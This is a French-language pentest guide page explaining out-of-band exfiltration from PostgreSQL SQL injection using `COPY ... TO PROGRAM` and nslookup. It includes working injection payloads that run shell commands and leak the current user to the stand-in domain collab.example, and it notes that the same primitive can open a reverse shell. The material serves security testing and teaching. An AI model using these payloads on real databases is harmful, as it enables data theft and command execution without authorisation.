---
order: 5
title: "Exfiltration hors bande depuis l'injection PostgreSQL"
description: "Exfiltrer des données PostgreSQL sur DNS avec COPY ... TO PROGRAM et une commande dynamique construite dans un bloc DO, pour les injections aveugles avec droits d'exécution de programme."
keywords:
  - hors bande
  - exfiltration DNS
  - COPY TO PROGRAM
  - nslookup
  - OOB PostgreSQL
---

# Hors bande

Quand rien n'est reflété et que le timing est trop lent, un rôle avec droits d'exécution de programme peut pousser des données vers l'extérieur sur le réseau. PostgreSQL n'a pas de fonction HTTP ou DNS intégrée, mais `COPY ... TO PROGRAM` exécute une commande shell, et une commande qui résout un nom d'hôte forgé fuite des données vers un serveur de noms de l'attaquant. Cela nécessite un superutilisateur ou le rôle `pg_execute_server_program`.

Une commande fixe confirme d'abord à la fois l'exécution de programme et le DNS sortant :

```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup confirm.collab.example'-- 
```

Pour transporter des données, le nom d'hôte doit inclure la valeur à voler, ce qui implique de construire la chaîne de commande dynamiquement. Un bloc `DO` lit la valeur dans une variable et assemble la commande avec `EXECUTE` :

```sql
'; DO $$ DECLARE p text; BEGIN SELECT current_user INTO p; EXECUTE 'COPY (SELECT '''') TO PROGRAM ''nslookup '||p||'.collab.example'''; END $$-- 
```

Le serveur de noms de l'attaquant pour `collab.example` journalise `<current_user>.collab.example`, révélant la valeur. Les valeurs plus longues ou non compatibles DNS sont encodées (par exemple en hexadécimal via `encode(...,'hex')`) et réparties sur plusieurs labels. Un listener tel que Burp Collaborator fait office de serveur de noms de journalisation.

Comme elle exécute une vraie commande, c'est aussi un tremplin vers l'exécution complète de commandes : le même `COPY ... TO PROGRAM` qui résout un nom peut démarrer un reverse shell. Le hors bande n'est que l'usage à plus faible empreinte de cette primitive pour une cible aveugle.

## Outils

- **sqlmap** : automatise l'exfiltration hors bande avec `--dns-domain`.
- **Burp Collaborator** : serveur de noms de journalisation qui enregistre les labels DNS exfiltrés.
- **psql** : client officiel pour construire la charge `COPY ... TO PROGRAM`.

## Références

- PostgreSQL Documentation: COPY ... TO PROGRAM, DO, EXECUTE
- OWASP Testing Guide: Testing for SQL Injection
